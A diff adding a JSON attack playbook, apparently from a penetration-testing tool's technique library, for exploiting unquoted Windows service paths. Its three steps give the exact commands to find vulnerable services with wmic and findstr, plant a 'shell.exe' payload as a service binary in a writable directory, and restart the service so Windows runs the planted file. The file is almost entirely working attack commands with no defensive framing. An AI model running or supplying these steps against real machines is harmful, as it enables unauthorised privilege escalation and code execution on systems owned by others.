@@ -1,0 +1,25 @@
+{
+	"name": "Unquoted Service Path Exploitation",
+	"description": "Abuse missing quotes in service paths to execute arbitrary binary.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "Find Unquoted Paths",
+			"command": "wmic service get name,pathname | findstr /i /v /c:\"C:\\Windows\\\" | findstr \" \" | findstr /i /v /c:\".exe\"",
+			"description": "List services with spaces and no quotes."
+		},
+		{
+			"index": 2,
+			"name": "Plant Payload",
+			"command": "copy shell.exe \"C:\\Program Files\\Sub Dir\\service.exe\"",
+			"description": "Place in first writable segment."
+		},
+		{
+			"index": 3,
+			"name": "Restart Service",
+			"command": "net stop BadService && net start BadService",
+			"description": "Windows executes planted binary first."
+		}
+	]
+}
